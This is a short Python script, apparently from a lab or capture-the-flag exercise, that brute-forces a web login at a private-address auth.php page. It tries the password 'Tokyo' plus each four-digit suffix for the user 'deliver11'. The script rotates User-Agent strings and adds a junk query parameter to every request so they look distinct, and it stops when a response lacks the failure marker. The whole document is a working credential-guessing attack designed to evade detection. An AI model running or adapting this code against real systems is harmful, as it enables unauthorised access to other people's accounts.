import requests
import time
import random

x=0
password='Tokyo'

username='deliver11'

# iterate from 1000 to 9999
# change user-agent
# add a fake query to the url everytime to mimic different requests
user_agents = [
'Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0',
'Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko',
'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36',
'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0',
]

for x in range(1000, 10000):
 url = 'http://10.82.142.162/auth.php'+f'?i={x}'

 headers = {
 'Content-Type':'application/x-www-form-urlencoded',
 'User-Agent': random.choice(user_agents)
 }
 data = f'username=deliver11&password=Tokyo{x}'
 resp = requests.post(url, headers=headers, data=data, timeout=5)
 if "auth_failed" in resp.text:
  print(f'[FAILED] Payload: "Tokyo{x}", Code: {resp.status_code} || Content: {len(resp.content)}')
 else:
  print(f'[SUCCESS]Payload: "Tokyo{x}", Code: {resp.status_code} || Content: {len(resp.content)}')

  break
